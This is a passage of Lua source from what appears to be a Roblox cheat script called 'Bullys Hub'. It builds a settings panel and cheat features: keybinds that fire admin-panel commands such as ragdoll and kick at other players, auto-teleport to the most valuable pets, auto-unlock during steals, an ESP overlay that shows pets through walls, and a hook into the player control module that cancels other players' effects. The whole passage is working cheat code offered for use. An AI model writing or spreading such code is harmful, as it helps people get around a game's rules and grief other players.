local rClickToAP = CreateRow("Click To Admin Panel")

CreateToggleSwitch(rClickToAP, Config.ClickToAP, function(ns, set)

    set(ns); Config.ClickToAP = ns; SaveConfig()

    ShowNotification("CLICK TO AP", ns and "ENABLED" or "DISABLED")

end)

local rClickToAPSingle = CreateRow("Click To AP Single Command")

CreateToggleSwitch(rClickToAPSingle, Config.ClickToAPSingleCommand, function(ns, set)

    set(ns); Config.ClickToAPSingleCommand = ns; SaveConfig()

    ShowNotification("CLICK TO AP SINGLE", ns and "ENABLED" or "DISABLED")

end)

local rClickToAPKeybind = CreateRow("Click To AP Keybind")

local bClickToAPKeybind = Instance.new("TextButton", rClickToAPKeybind)

bClickToAPKeybind.Size=UDim2.new(0,60,0,24); bClickToAPKeybind.Position=UDim2.new(1,-65,0.5,-12)

bClickToAPKeybind.BackgroundColor3=Color3.fromRGB(22,22,35); bClickToAPKeybind.Text=Config.ClickToAPKeybind or "L"

bClickToAPKeybind.Font=Enum.Font.GothamBold; bClickToAPKeybind.TextColor3=Color3.fromRGB(185,188,215); bClickToAPKeybind.TextSize=12

Instance.new("UICorner",bClickToAPKeybind).CornerRadius=UDim.new(0,4)

bClickToAPKeybind.MouseButton1Click:Connect(function()

    bClickToAPKeybind.Text="..."; bClickToAPKeybind.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.ClickToAPKeybind=inp.KeyCode.Name; bClickToAPKeybind.Text=inp.KeyCode.Name

            bClickToAPKeybind.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("CLICK TO AP KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

local rProximityAPKeybind = CreateRow("Proximity AP Keybind")

local bProximityAPKeybind = Instance.new("TextButton", rProximityAPKeybind)

bProximityAPKeybind.Size=UDim2.new(0,60,0,24); bProximityAPKeybind.Position=UDim2.new(1,-70,0.5,-12)

bProximityAPKeybind.BackgroundColor3=Color3.fromRGB(22,22,35); bProximityAPKeybind.Text=Config.ProximityAPKeybind or "P"

bProximityAPKeybind.Font=Enum.Font.GothamBold; bProximityAPKeybind.TextColor3=Color3.fromRGB(185,188,215); bProximityAPKeybind.TextSize=12

Instance.new("UICorner",bProximityAPKeybind).CornerRadius=UDim.new(0,4)

bProximityAPKeybind.MouseButton1Click:Connect(function()

    bProximityAPKeybind.Text="..."; bProximityAPKeybind.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.ProximityAPKeybind=inp.KeyCode.Name; bProximityAPKeybind.Text=inp.KeyCode.Name

            bProximityAPKeybind.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("PROXIMITY AP KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

CreateSectionHeader("ALERTS")

local rAlertsEnabled = CreateRow("Enable Alerts")

CreateToggleSwitch(rAlertsEnabled, Config.AlertsEnabled, function(ns, set)

    set(ns); Config.AlertsEnabled = ns; SaveConfig()

    ShowNotification("PRIORITY ALERTS", ns and "ENABLED" or "DISABLED")

end)

local rAlertSound = CreateRow("Alert Sound ID")

local soundBox = Instance.new("TextBox", rAlertSound)

soundBox.Size = UDim2.new(0, 180, 0, 24)

soundBox.Position = UDim2.new(1, -185, 0.5, -12)

soundBox.BackgroundColor3 = Color3.fromRGB(22,22,35)

soundBox.Text = Config.AlertSoundID or "rbxassetid://6518811702"

soundBox.Font = Enum.Font.Gotham

soundBox.TextSize = 10

soundBox.TextColor3 = Color3.fromRGB(185,188,215)

soundBox.PlaceholderText = "Sound ID"

Instance.new("UICorner", soundBox).CornerRadius = UDim.new(0, 4)

soundBox.FocusLost:Connect(function()

    Config.AlertSoundID = soundBox.Text

    SaveConfig()

    ShowNotification("ALERT SOUND", "Updated")

end)

CreateSectionHeader("JOB JOINER")

local rJoinerRow = CreateRow("Job ID Joiner")

CreateToggleSwitch(rJoinerRow, Config.ShowJobJoiner, function(ns, set)

    set(ns); Config.ShowJobJoiner = ns; SaveConfig()

    local gui = PlayerGui:FindFirstChild("BullysJobJoiner")

    if gui then gui.Enabled = Config.ShowJobJoiner end

    ShowNotification("JOB ID JOINER", ns and "ENABLED" or "DISABLED")

end)

local rJoinerKey = CreateRow("Job Joiner Keybind")

local bJoinerKey = Instance.new("TextButton", rJoinerKey)

bJoinerKey.Size=UDim2.new(0,60,0,24); bJoinerKey.Position=UDim2.new(1,-70,0.5,-12)

bJoinerKey.BackgroundColor3=Color3.fromRGB(22,22,35); bJoinerKey.Text=Config.JobJoinerKey or "J"

bJoinerKey.Font=Enum.Font.GothamBold; bJoinerKey.TextColor3=Color3.fromRGB(185,188,215); bJoinerKey.TextSize=12

Instance.new("UICorner",bJoinerKey).CornerRadius=UDim.new(0,4)

bJoinerKey.MouseButton1Click:Connect(function()

    bJoinerKey.Text="..."; bJoinerKey.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.JobJoinerKey=inp.KeyCode.Name; bJoinerKey.Text=inp.KeyCode.Name

            bJoinerKey.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("JOB JOINER KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

CreateSectionHeader("PROTECTION")

local rAntiBeeDisco = CreateRow("Anti-Bee & Anti-Disco")

CreateToggleSwitch(rAntiBeeDisco, Config.AntiBeeDisco, function(ns, set)

    set(ns); Config.AntiBeeDisco = ns; SaveConfig()

    if ns then

        if _G.ANTI_BEE_DISCO and _G.ANTI_BEE_DISCO.Enable then

            _G.ANTI_BEE_DISCO.Enable()

        end

    else

        if _G.ANTI_BEE_DISCO and _G.ANTI_BEE_DISCO.Disable then

            _G.ANTI_BEE_DISCO.Disable()

        end

    end

    ShowNotification("ANTI-BEE & DISCO", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("CAMERA")

local rFOV = CreateRow("FOV")

local fovSliderBg = Instance.new("Frame", rFOV)

fovSliderBg.Size = UDim2.new(0, 140, 0, 5)

fovSliderBg.Position = UDim2.new(1, -200, 0.5, -2.5)

fovSliderBg.BackgroundColor3 = Color3.fromRGB(30, 32, 38)

Instance.new("UICorner", fovSliderBg).CornerRadius = UDim.new(1, 0)

local fovFill = Instance.new("Frame", fovSliderBg)

fovFill.BackgroundColor3 = Color3.fromRGB(14,14,20)

fovFill.Size = UDim2.new(0, 0, 1, 0)

Instance.new("UICorner", fovFill).CornerRadius = UDim.new(1, 0)

local fovKnob = Instance.new("Frame", fovSliderBg)

fovKnob.Size = UDim2.new(0, 12, 0, 12)

fovKnob.BackgroundColor3 = Color3.fromRGB(185,188,215)

fovKnob.AnchorPoint = Vector2.new(0.5, 0.5)

fovKnob.Position = UDim2.new(0, 0, 0.5, 0)

Instance.new("UICorner", fovKnob).CornerRadius = UDim.new(1, 0)

local fovValLbl = Instance.new("TextLabel", rFOV)

fovValLbl.Size = UDim2.new(0, 40, 0, 20)

fovValLbl.Position = UDim2.new(1, -50, 0.5, -10)

fovValLbl.BackgroundTransparency = 1

fovValLbl.Text = string.format("%.1f", Config.FOV)

fovValLbl.TextColor3 = Color3.fromRGB(185,188,215)

fovValLbl.Font = Enum.Font.GothamBold

fovValLbl.TextSize = 13

local function updateFOVSlider(val)

    val = math.clamp(val, 30, 180)

    Config.FOV = val

    SaveConfig()

    fovValLbl.Text = string.format("%.1f", val)

    local pct = (val - 30) / 150

    fovFill.Size = UDim2.new(pct, 0, 1, 0)

    fovKnob.Position = UDim2.new(pct, 0, 0.5, 0)

    if Workspace.CurrentCamera then

        Workspace.CurrentCamera.FieldOfView = val

    end

    ShowNotification("FIELD OF VIEW", string.format("%.1f", val))

end

updateFOVSlider(Config.FOV)

local fovDragging = false

fovSliderBg.InputBegan:Connect(function(i)

    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then fovDragging = true end

end)

UserInputService.InputEnded:Connect(function(i)

    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then fovDragging = false end

end)

UserInputService.InputChanged:Connect(function(i)

    if fovDragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then

        local x = i.Position.X

        local r = fovSliderBg.AbsolutePosition.X

        local w = fovSliderBg.AbsoluteSize.X

        local p = (x - r) / w

        updateFOVSlider(30 + (p * 150))

    end

end)

CreateSectionHeader("MENU")

    local rMenu = CreateRow("Menu Toggle Key")

    local bMenu = Instance.new("TextButton", rMenu)

    bMenu.Size=UDim2.new(0,80,0,24); bMenu.Position=UDim2.new(1,-90,0.5,-12)

    bMenu.BackgroundColor3=Color3.fromRGB(22,22,35); bMenu.Text=Config.MenuKey

    bMenu.Font=Enum.Font.GothamBold; bMenu.TextColor3=Color3.fromRGB(185,188,215); bMenu.TextSize=12

    Instance.new("UICorner",bMenu).CornerRadius=UDim.new(0,4)

    bMenu.MouseButton1Click:Connect(function()

        bMenu.Text="..."; bMenu.TextColor3=Color3.fromRGB(80, 140, 255)

        local con; con=UserInputService.InputBegan:Connect(function(inp)

            if inp.UserInputType==Enum.UserInputType.Keyboard then

                Config.MenuKey=inp.KeyCode.Name; bMenu.Text=inp.KeyCode.Name

                bMenu.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

                ShowNotification("MENU KEYBIND", inp.KeyCode.Name)

            end

        end)

    end)

CreateSectionHeader("UI CONTROLS")

local rLock = CreateRow("Lock UI Dragging")

CreateToggleSwitch(rLock, Config.UILocked, function(ns, set)

    set(ns); Config.UILocked = ns; SaveConfig()

    ShowNotification("UI LOCK", ns and "ENABLED" or "DISABLED")

end)

local rReset = CreateRow("Reset UI Positions")

local bReset = Instance.new("TextButton", rReset)

bReset.Size=UDim2.new(0,80,0,24); bReset.Position=UDim2.new(1,-90,0.5,-12)

bReset.BackgroundColor3=Color3.fromRGB(200,60,60); bReset.Text="RESET"

bReset.Font=Enum.Font.GothamBold; bReset.TextColor3=Color3.fromRGB(185,188,215); bReset.TextSize=12

Instance.new("UICorner",bReset).CornerRadius=UDim.new(0,4)

bReset.MouseButton1Click:Connect(function()

    Config.Positions = DefaultConfig.Positions

    SaveConfig()

    ShowNotification("UI RESET", "Positions restored")

    sFrame.Position = UDim2.new(DefaultConfig.Positions.Settings.X, 0, DefaultConfig.Positions.Settings.Y, 0)

    if PlayerGui:FindFirstChild("AutoStealUI") then

        PlayerGui.AutoStealUI.Frame.Position = UDim2.new(DefaultConfig.Positions.AutoSteal.X, 0, DefaultConfig.Positions.AutoSteal.Y, 0)

    end

    if PlayerGui:FindFirstChild("XiAdminPanel") and PlayerGui.XiAdminPanel:FindFirstChild("Frame") then

        PlayerGui.XiAdminPanel.Frame.Position = UDim2.new(DefaultConfig.Positions.AdminPanel.X, 0, DefaultConfig.Positions.AdminPanel.Y, 0)

    end

    if PlayerGui:FindFirstChild("XiAdminToolsPanel") and PlayerGui.XiAdminToolsPanel:FindFirstChild("Frame") then

        PlayerGui.XiAdminToolsPanel.Frame.Position = UDim2.new(DefaultConfig.Positions.AdminToolsPanel.X, 0, DefaultConfig.Positions.AdminToolsPanel.Y, 0)

    end

    ShowNotification("UI RESET", "Positions restored to default")

end)

local function updateSettingsCanvasSize()

    local contentHeight = sLayout.AbsoluteContentSize.Y

    sList.CanvasSize = UDim2.new(0, 0, 0, math.max(contentHeight + 20, sList.AbsoluteSize.Y))

end

sLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSettingsCanvasSize)

task.defer(updateSettingsCanvasSize)

    sList.ScrollBarThickness = 0

    sList.ScrollingEnabled = true

    sList.ElasticBehavior = Enum.ElasticBehavior.Always

    UserInputService.InputBegan:Connect(function(input, gp)

        if input.KeyCode == safeKeyCode(Config.MenuKey, Enum.KeyCode.LeftControl) then

            if _G.BullysSettingsUI and _G.BullysSettingsUI.panel then

                _G.BullysSettingsUI.panel.Visible = not _G.BullysSettingsUI.panel.Visible

            else

                settingsGui.Enabled = not settingsGui.Enabled

            end

        end

        if input.KeyCode == safeKeyCode(Config.KickKey, nil) then

            kickPlayer()

        end

        if input.KeyCode == safeKeyCode(Config.RagdollSelfKey, nil) then

            if not isOnCooldown("ragdoll") then

                if runAdminCommand(LocalPlayer, "ragdoll") then

                    activeCooldowns["ragdoll"] = tick()

                    setGlobalVisualCooldown("ragdoll")

                    ShowNotification("RAGDOLL SELF", "Ragdolled " .. LocalPlayer.Name)

                end

            else

                ShowNotification("RAGDOLL SELF", "Ragdoll on cooldown")

            end

        end

        if input.KeyCode == safeKeyCode(Config.ProximityAPKeybind, nil) then

            ProximityAPActive = not ProximityAPActive

            if SharedState.ProximityAPButton then

                updateProximityAPButton()

            end

            ShowNotification("PROXIMITY AP", ProximityAPActive and "ENABLED" or "DISABLED")

        end

        if input.KeyCode == safeKeyCode(Config.ClickToAPKeybind, Enum.KeyCode.L) then

            Config.ClickToAP = not Config.ClickToAP

            SaveConfig()

            ShowNotification("CLICK TO AP", Config.ClickToAP and "ENABLED" or "DISABLED")

        end

        if input.KeyCode == safeKeyCode(Config.JobJoinerKey, nil) then

            local joinerGui = PlayerGui:FindFirstChild("BullysJobJoiner")

            if joinerGui then

                Config.ShowJobJoiner = not Config.ShowJobJoiner

                joinerGui.Enabled = Config.ShowJobJoiner

                SaveConfig()

                ShowNotification("JOB ID JOINER", Config.ShowJobJoiner and "OPENED" or "CLOSED")

            end

        end

    end)

task.spawn(function()

    task.wait(1)

    if Config.HideAdminPanel then

        local adUI = PlayerGui:FindFirstChild("XiAdminPanel")

        if adUI then adUI.Enabled = false end

    end

    if Config.ShowAdminToolsPanel == false then

        local toolsUI = PlayerGui:FindFirstChild("XiAdminToolsPanel")

        if toolsUI then toolsUI.Enabled = false end

    end

    if Config.HideAutoSteal then

        local asUI = PlayerGui:FindFirstChild("AutoStealUI")

        if asUI then asUI.Enabled = false end

    end

    if Config.HideStatusHUD then

        local g = PlayerGui:FindFirstChild("BullysStatusHUD")

        if g then g.Enabled = false end

    end

end)
local function parseMinGen(str)
    if not str or type(str) ~= "string" then return 0 end
    str = str:gsub("%s", ""):lower()
    if str == "" then return 0 end
    local num, suffix = str:match("^([%d%.]+)([kmb]?)$")
    if not num then return 0 end
    num = tonumber(num)
    if not num or num < 0 then return 0 end
    if suffix == "k" then return num * 1e3
    elseif suffix == "m" then return num * 1e6
    elseif suffix == "b" then return num * 1e9
    end
    return num
end

if Config.TpSettings.TpOnLoad then
    task.spawn(function()
        while true do
            local cache = SharedState.AllAnimalsCache
            if (cache and #cache > 0) or SharedState.SelectedPetData then break end
            RunService.Heartbeat:Wait()
        end
        local minGen = parseMinGen(Config.TpSettings.MinGenForTp)
        if minGen > 0 then
            local cache = SharedState.AllAnimalsCache or {}
            if ((cache[1] and cache[1].genValue) or 0) < minGen then return end
        end
        -- TP Delay (ms) — mesma config usada no TP manual
        local tpDelay = tonumber(Config.TpSettings.TpDelay) or 0
        if tpDelay > 0 then task.wait(tpDelay / 1000) end
        local w=0; while not _G.tpToBestBrainrot and w<60 do task.wait(0.05); w=w+1 end
        if _G.tpToBestBrainrot then pcall(_G.tpToBestBrainrot) else runAutoSnipe() end
    end)
end

LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()

    local isStealing = LocalPlayer:GetAttribute("Stealing")

    if isStealing then

        if Config.AutoUnlockOnSteal then

            triggerClosestUnlock(nil, 19)

        end

    end

end)

-- (sistema de Steal Speed removido completamente)

task.spawn(function()

    local brainrotESPEnabled = Config.BrainrotESP

    local brainrotESPFolder = Instance.new("Folder")

    brainrotESPFolder.Name = "BullysBrainrotESP"

    brainrotESPFolder.Parent = Workspace

    local brainrotBillboards = {}

    local hiddenOverheads = {}

    local MUT_COLORS = {

        Cursed = Color3.fromRGB(170, 170, 170),

        Gold = Color3.fromRGB(170, 170, 170),

        Diamond = Color3.fromRGB(170, 170, 170),

        YinYang = Color3.fromRGB(170, 170, 170),

        Rainbow = Color3.fromRGB(170, 170, 170),

        Lava = Color3.fromRGB(170, 170, 170),

        Candy = Color3.fromRGB(170, 170, 170),

        Bloodrot = Color3.fromRGB(170, 170, 170),

        Radioactive = Color3.fromRGB(170, 170, 170),

        Divine = Color3.fromRGB(170, 170, 170)

    }

    

    local function createBrainrotBillboard(data)

        local bb = Instance.new("BillboardGui")

        bb.Name = "BrainrotESP_" .. data.uid

        bb.Size = UDim2.new(0, 160, 0, 38)

        bb.StudsOffset = Vector3.new(0, 1.8, 0)

        bb.AlwaysOnTop = true

        bb.LightInfluence = 0

        bb.MaxDistance = 3000

        

        local hasMut = data.mutation and data.mutation ~= "None" and data.mutation ~= "N/A"

        local color = hasMut and (MUT_COLORS[data.mutation] or Color3.fromRGB(175, 175, 175)) or Color3.fromRGB(175, 175, 175)

        

        local container = Instance.new("Frame", bb)

        container.Size = UDim2.new(1, 0, 1, 0)

        container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

        container.BackgroundTransparency = 0.5

        container.BorderSizePixel = 0

        Instance.new("UICorner", container).CornerRadius = UDim.new(0, 4)

        

        

        local nameLabel = Instance.new("TextLabel", container)

        nameLabel.Size = UDim2.new(1, -6, 0, 18)

        nameLabel.Position = UDim2.new(0, 3, 0, 2)

        nameLabel.BackgroundTransparency = 1

        nameLabel.Font = Enum.Font.GothamBlack

        nameLabel.TextSize = 13

        nameLabel.TextColor3 = color

        nameLabel.Text = (data.name or data.petName) or "???"

        nameLabel.TextXAlignment = Enum.TextXAlignment.Center

        

        local genLabel = Instance.new("TextLabel", container)

        genLabel.Size = UDim2.new(1, -6, 0, 14)

        genLabel.Position = UDim2.new(0, 3, 0, 20)

        genLabel.BackgroundTransparency = 1

        genLabel.Font = Enum.Font.GothamBold

        genLabel.TextSize = 11

        genLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

        genLabel.Text = data.genText or ""

        genLabel.TextXAlignment = Enum.TextXAlignment.Center

        

        if hasMut then

            local mutBadge = Instance.new("TextLabel", bb)

            mutBadge.Size = UDim2.new(0, 60, 0, 14)

            mutBadge.Position = UDim2.new(0.5, -30, 0, -16)

            mutBadge.BackgroundColor3 = color

            mutBadge.BackgroundTransparency = 0.3

            mutBadge.Font = Enum.Font.GothamBlack

            mutBadge.TextSize = 9

            mutBadge.TextColor3 = Color3.fromRGB(255, 255, 255)

            mutBadge.Text = data.mutation:upper()

            Instance.new("UICorner", mutBadge).CornerRadius = UDim.new(0, 3)

        end

        

        return bb

    end

    

    local function hideDefaultOverhead(overhead)

        if overhead and overhead.Parent and not hiddenOverheads[overhead] then

            hiddenOverheads[overhead] = overhead.Enabled

            overhead.Enabled = false

        end

    end

    

    local function showDefaultOverhead(overhead)

        if overhead and hiddenOverheads[overhead] ~= nil then

            overhead.Enabled = hiddenOverheads[overhead]

            hiddenOverheads[overhead] = nil

        end

    end

    

    local function restoreAllOverheads()

        for overhead, wasEnabled in pairs(hiddenOverheads) do

            if overhead and overhead.Parent then

                overhead.Enabled = wasEnabled

            end

        end

        hiddenOverheads = {}

    end

    

    local function refreshBrainrotESP()

        if not brainrotESPEnabled then return end

        local cache = SharedState.AllAnimalsCache

        if not cache or #cache == 0 then 

            return 

        end

        

        local seen = {}

        for _, data in ipairs(cache) do

            if data.genValue >= 10000000 then

                seen[data.uid] = true

                

                if not brainrotBillboards[data.uid] then

                    local adornee = nil

                    local overhead = nil

                    local studsOffset = Vector3.new(0, 1.8, 0)

                    

                    if data.overhead and data.overhead.Parent then

                        overhead = data.overhead

                        if overhead:IsA("BillboardGui") then

                            studsOffset = overhead.StudsOffset

                        end

                        hideDefaultOverhead(overhead)

                        adornee = overhead.Parent

                        if not adornee:IsA("BasePart") then

                            adornee = adornee:FindFirstChildWhichIsA("BasePart", true)

                        end

                    end

                    

                    if not adornee and data.plot and data.slot then

                        adornee = findAdorneeGlobal(data)

                        if adornee then

                            local model = adornee.Parent

                            if model and model:IsA("Model") then

                                overhead = model:FindFirstChild("AnimalOverhead", true)

                                if not overhead then

                                    for _, child in ipairs(model:GetDescendants()) do

                                        if child.Name == "AnimalOverhead" and child:IsA("BillboardGui") then

                                            overhead = child

                                            break

                                        end

                                    end

                                end

                                

                                if overhead then

                                    if overhead:IsA("BillboardGui") then

                                        studsOffset = overhead.StudsOffset

                                    end

                                    hideDefaultOverhead(overhead)

                                end

                            end

                        end

                    end

                    

                    if adornee then

                        local bb = createBrainrotBillboard(data)

                        bb.Adornee = adornee

                        bb.StudsOffset = studsOffset

                        bb.Parent = adornee

                        brainrotBillboards[data.uid] = {bb = bb, overhead = overhead}

                    end

                end

            end

        end

        

        for uid, entry in pairs(brainrotBillboards) do

            if not seen[uid] then

                if entry.bb then entry.bb:Destroy() end

                if entry.overhead then showDefaultOverhead(entry.overhead) end

                brainrotBillboards[uid] = nil

            end

        end

    end

    

    local function clearBrainrotESP()

        for _, entry in pairs(brainrotBillboards) do

            if entry.bb then entry.bb:Destroy() end

            if entry.overhead then showDefaultOverhead(entry.overhead) end

        end

        brainrotBillboards = {}

        restoreAllOverheads()

    end

    

    espToggleRef.setFn = function(enabled)

        brainrotESPEnabled = enabled

        if enabled then

            task.spawn(function()

                task.wait(1)

                for i = 1, 5 do

                    pcall(refreshBrainrotESP)

                    task.wait(1)

                end

            end)

        else

            clearBrainrotESP()

        end

    end

    

    task.spawn(function()

        while true do

            task.wait(0.3)

            if brainrotESPEnabled then

                local cache = SharedState.AllAnimalsCache

                if cache and #cache > 0 then

                    pcall(refreshBrainrotESP)

                end

            end

        end

    end)

    

    task.spawn(function()

        while true do

            task.wait(2)

            if brainrotESPEnabled then

                local cache = SharedState.AllAnimalsCache

                if cache and #cache > 0 then

                    if next(brainrotBillboards) == nil then

                        clearBrainrotESP()

                    end

                    pcall(refreshBrainrotESP)

                end

            end

        end

    end)

end)

SharedState.FOV_MANAGER = {

    activeCount = 0,

    conn = nil,

    forcedFOV = 70,

}

function SharedState.FOV_MANAGER:Start()

    if self.conn then return end

    self.forcedFOV = Config.FOV or 70

    self.conn = RunService.Heartbeat:Connect(function()

        local cam = Workspace.CurrentCamera

        if not cam then return end

        local targetFOV = Config.FOV or self.forcedFOV

        if cam.FieldOfView ~= targetFOV then

            cam.FieldOfView = targetFOV

        end

    end)

end

function SharedState.FOV_MANAGER:Stop()

    if self.conn then

        self.conn:Disconnect()

        self.conn = nil

    end

end

function SharedState.FOV_MANAGER:Push()

    self.activeCount = self.activeCount + 1

    self:Start()

end

function SharedState.FOV_MANAGER:Pop()

    if self.activeCount > 0 then

        self.activeCount = self.activeCount - 1

    end

    if self.activeCount == 0 then

        self:Stop()

    end

end

SharedState.ANTI_BEE_DISCO = {

    running = false,

    connections = {},

    originalMoveFunction = nil,

    controlsProtected = false,

    badLightingNames = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true },

}

function SharedState.ANTI_BEE_DISCO.nuke(obj)

    if not obj or not obj.Parent then return end

    if SharedState.ANTI_BEE_DISCO.badLightingNames[obj.Name] then

        pcall(function() obj:Destroy() end)

    end

end

function SharedState.ANTI_BEE_DISCO.disconnectAll()

    for _, conn in ipairs(SharedState.ANTI_BEE_DISCO.connections) do

        if typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end

    end

    SharedState.ANTI_BEE_DISCO.connections = {}

end

function SharedState.ANTI_BEE_DISCO.protectControls()

    if SharedState.ANTI_BEE_DISCO.controlsProtected then return end

    pcall(function()

        local PlayerScripts = LocalPlayer.PlayerScripts

        local PlayerModule = PlayerScripts:FindFirstChild("PlayerModule")

        if not PlayerModule then return end

        local Controls = require(PlayerModule):GetControls()

        if not Controls then return end

        local ab = SharedState.ANTI_BEE_DISCO

        if not ab.originalMoveFunction then ab.originalMoveFunction = Controls.moveFunction end

        local function protectedMoveFunction(self, moveVector, relativeToCamera)

            if ab.originalMoveFunction then ab.originalMoveFunction(self, moveVector, relativeToCamera) end

        end

        table.insert(ab.connections, RunService.Heartbeat:Connect(function()

            if not ab.running or not Config.AntiBeeDisco then return end

            if Controls.moveFunction ~= protectedMoveFunction then Controls.moveFunction = protectedMoveFunction end

        end))

        Controls.moveFunction = protectedMoveFunction

        ab.controlsProtected = true

    end)

end

function SharedState.ANTI_BEE_DISCO.restoreControls()

    if not SharedState.ANTI_BEE_DISCO.controlsProtected then return end

    pcall(function()

        local PlayerModule = LocalPlayer.PlayerScripts:FindFirstChild("PlayerModule")

        if not PlayerModule then return end

        local Controls = require(PlayerModule):GetControls()

        local ab = SharedState.ANTI_BEE_DISCO

        if Controls and ab.originalMoveFunction then

            Controls.moveFunction = ab.originalMoveFunction

            ab.controlsProtected = false

        end

    end)

end

function SharedState.ANTI_BEE_DISCO.blockBuzzingSound()

    pcall(function()

        local beeScript = LocalPlayer.PlayerScripts:FindFirstChild("Bee", true)

        if beeScript then

            local buzzing = beeScript:FindFirstChild("Buzzing")

            if buzzing and buzzing:IsA("Sound") then buzzing:Stop(); buzzing.Volume = 0 end

        end

    end)

end

function SharedState.ANTI_BEE_DISCO.Enable()

    local ab = SharedState.ANTI_BEE_DISCO

    if ab.running then return end

    ab.running = true

    for _, inst in ipairs(Lighting:GetDescendants()) do ab.nuke(inst) end

    table.insert(ab.connections, Lighting.DescendantAdded:Connect(function(obj)

        if not ab.running or not Config.AntiBeeDisco then return end

        ab.nuke(obj)

    end))

    ab.protectControls()

    table.insert(ab.connections, RunService.Heartbeat:Connect(function()

        if not ab.running or not Config.AntiBeeDisco then return end

        ab.blockBuzzingSound()

    end))

    SharedState.FOV_MANAGER:Push()

    ShowNotification("ANTI-BEE & DISCO", "Enabled")

end

function SharedState.ANTI_BEE_DISCO.Disable()

    local ab = SharedState.ANTI_BEE_DISCO

    if not ab.running then return end

    ab.running = false

    ab.restoreControls()

    ab.disconnectAll()

    SharedState.FOV_MANAGER:Pop()

    ShowNotification("ANTI-BEE & DISCO", "Disabled")

end

_G.ANTI_BEE_DISCO = SharedState.ANTI_BEE_DISCO

if Config.AntiBeeDisco then

    task.delay(1, function()

        if SharedState.ANTI_BEE_DISCO.Enable then SharedState.ANTI_BEE_DISCO.Enable() end

    end)

end

task.spawn(function()

    while true do

        if Workspace.CurrentCamera then

            if Config.FOV and Config.FOV ~= Workspace.CurrentCamera.FieldOfView then

                Workspace.CurrentCamera.FieldOfView = Config.FOV

            end

        end

        task.wait(0.1)

    end

end)

task.spawn(function()

    -- Destroi e reconstroi o HUD (chamado tambem pelo applyTheme)

    local function buildHUD()

        local existing = PlayerGui:FindFirstChild("BullysStatusHUD")

        if existing then existing:Destroy() end

        -- ── HUD ultra-leve: @shh3x | FPS | PING ─────────────────────────

        local hudGui = Instance.new("ScreenGui")

        hudGui.Name           = "BullysStatusHUD"

        hudGui.ResetOnSpawn   = false

        hudGui.DisplayOrder   = 10

        hudGui.IgnoreGuiInset = false

        hudGui.Parent         = PlayerGui

        -- Container principal (fundo 100% transparente)

        local bar = Instance.new("Frame", hudGui)

        bar.Name                  = "Main"

        bar.Size                  = UDim2.new(0, 400, 0, 34)

        bar.AnchorPoint           = Vector2.new(0.5, 1)

        bar.Position              = UDim2.new(0.5, 0, 1, -70)

        bar.BackgroundTransparency = 1

        bar.BorderSizePixel       = 0

        -- Sem UIListLayout: posicionamento manual (BULLYS HUB à esquerda, FPS+PING à direita)

        -- Label @shh3x

        local lblTag = Instance.new("TextLabel", bar)

        lblTag.Size                = UDim2.new(0, 110, 1, 0)

        lblTag.Position            = UDim2.new(0, 10, 0, 0)

        lblTag.BackgroundTransparency = 1

        lblTag.Text                = "BULLYS HUB"

        lblTag.Font                = Enum.Font.GothamBlack

        lblTag.TextSize            = 14

        lblTag.TextColor3          = Color3.fromRGB(200, 200, 200)

        lblTag.TextTransparency    = 0.25

        lblTag.TextXAlignment      = Enum.TextXAlignment.Left

        -- Créditos no meio

        local lblCreds = Instance.new("TextLabel", bar)

        lblCreds.Size              = UDim2.new(0, 140, 1, 0)

        lblCreds.AnchorPoint       = Vector2.new(0.5, 0)

        lblCreds.Position          = UDim2.new(0.5, -40, 0, 0)

        lblCreds.BackgroundTransparency = 1

        lblCreds.Text              = "@shh3x  @bwzs"

        lblCreds.Font              = Enum.Font.GothamBold

        lblCreds.TextSize          = 13

        lblCreds.TextColor3        = Color3.fromRGB(180, 180, 190)

        lblCreds.TextTransparency  = 0.2

        lblCreds.TextXAlignment    = Enum.TextXAlignment.Center

        -- PING (mais à direita)

        local lblPing = Instance.new("TextLabel", bar)

        lblPing.Size              = UDim2.new(0, 80, 1, 0)

        lblPing.AnchorPoint       = Vector2.new(1, 0)

        lblPing.Position          = UDim2.new(1, -10, 0, 0)

        lblPing.BackgroundTransparency = 1

        lblPing.Text              = "PING --ms"

        lblPing.Font              = Enum.Font.GothamBold

        lblPing.TextSize          = 14

        lblPing.TextColor3        = Color3.fromRGB(255, 255, 255)

        lblPing.TextTransparency  = 0.2

        lblPing.TextXAlignment    = Enum.TextXAlignment.Right

        -- Separador 2 (entre FPS e PING)

        local sep2 = Instance.new("TextLabel", bar)

        sep2.Size              = UDim2.new(0, 4, 1, 0)

        sep2.AnchorPoint       = Vector2.new(1, 0)

        sep2.Position          = UDim2.new(1, -96, 0, 0)

        sep2.BackgroundTransparency = 1

        sep2.Text              = "·"

        sep2.Font              = Enum.Font.GothamBold

        sep2.TextSize          = 13

        sep2.TextColor3        = Color3.fromRGB(120, 120, 120)

        sep2.TextTransparency  = 0.4

        -- FPS (à esquerda do separador)

        local lblFps = Instance.new("TextLabel", bar)

